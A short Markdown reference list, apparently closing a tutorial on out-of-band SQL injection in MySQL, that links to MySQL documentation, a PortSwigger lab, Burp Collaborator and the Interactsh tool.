
## 📚 References

- [MySQL LOAD_FILE Documentation](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)
- [PortSwigger - Out-of-Band SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
- [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [Interactsh - Open source OOB tool](https://github.com/projectdiscovery/interactsh)
- [MySQL on Windows Setup](https://dev.mysql.com/doc/refman/8.0/en/windows-installation.html)
